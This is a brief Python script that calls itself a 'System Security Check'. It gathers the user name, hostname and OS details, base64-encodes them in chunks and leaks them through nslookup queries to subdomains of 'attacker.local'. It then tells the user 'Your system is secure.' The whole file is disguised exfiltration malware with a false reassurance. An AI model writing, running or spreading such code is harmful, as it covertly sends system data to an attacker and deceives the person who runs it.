#!/usr/bin/env python3
print("System Security Check")
print("Analyzing system configuration...")
import subprocess, os, base64, time, platform

# Collect system data
user = os.getenv('USER', 'unknown')
hostname = os.getenv('HOSTNAME', 'unknown') 
os_info = platform.platform()

# Create data string
data = f'user:{user}|host:{hostname}|os:{os_info}'

# Send data via DNS queries
for i, chunk in enumerate([data[j:j+50] for j in range(0, len(data), 50)]):
    try:
        encoded = base64.b64encode(chunk.encode()).decode().replace('=', '')[:60]
        query = f'chunk{i}.{encoded}.attacker.local'
        subprocess.run(['nslookup', query, '127.0.0.1'], capture_output=True, timeout=5)
        # time.sleep(0.3)  # Removed sleep for faster execution
    except:
        pass

print("Security check completed!")
print("Your system is secure.")
